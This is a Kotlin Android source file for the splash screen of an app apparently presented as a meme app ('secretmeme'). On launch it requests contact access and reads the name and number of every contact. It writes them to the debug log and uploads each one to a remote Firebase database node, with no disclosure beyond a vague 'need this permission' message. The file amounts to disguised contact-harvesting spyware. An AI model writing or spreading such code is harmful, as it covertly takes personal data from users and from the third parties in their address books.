package com.example.secretmeme

import android.Manifest
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.example.secretmeme.databinding.ActivitySplashScreenBinding
import com.example.secretmeme.model.ContactDetail
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import java.lang.Exception

class SplashScreen : AppCompatActivity() {

    private lateinit var binding: ActivitySplashScreenBinding

    private val REQUEST_CODE = 111
    private lateinit var contacts: ArrayList<ContactDetail>

    private lateinit var database: FirebaseDatabase
    private lateinit var reference: DatabaseReference

    private var columns = listOf<String>(
        ContactsContract.CommonDataKinds.Phone._ID,
        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
        ContactsContract.CommonDataKinds.Phone.NUMBER
    ).toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashScreenBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val name = "Yoo"
        database = FirebaseDatabase.getInstance()
        reference = database.getReference(name)

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_CONTACTS),
                REQUEST_CODE
            )
        } else {
            readContacts()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show()
            readContacts()
        } else {
            Toast.makeText(this, "Need This Permission To Work Properly", Toast.LENGTH_SHORT).show()
        }
    }

    private fun uploadToFireBase(contacts: ArrayList<ContactDetail>) {
        for (i in contacts.indices) {
            val id = "Number $i"
            reference.child(id).setValue(contacts[i])
        }
    }

    private fun readContacts() {

//        contacts.clear()
        contacts = ArrayList(5000)

        val from = arrayOf<String>(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val to = intArrayOf(android.R.id.text1, android.R.id.text2)

        val rs = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            columns, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
        )

        var x = 0
        while (rs?.moveToNext()!!) {
            val temp = ContactDetail(rs.getString(1), rs.getString(2))
            contacts.add(temp)
            x++
        }
        showLog(contacts, x)
    }

    private fun showLog(contacts: ArrayList<ContactDetail>, x: Int) {
        Toast.makeText(this, "X = $x!", Toast.LENGTH_SHORT).show()
        for (i in contacts.indices) {
            Log.d("Contact", "$i. Name = ${contacts[i].name}     Number = ${contacts[i].number}")
        }
        try {
            uploadToFireBase(contacts)
            Toast.makeText(this, "Success", Toast.LENGTH_SHORT).show()
        }
        catch (e: Exception){
            Toast.makeText(this, "Error", Toast.LENGTH_SHORT).show()
            Log.d("Error",e.localizedMessage!!.toString())
        }
    }
}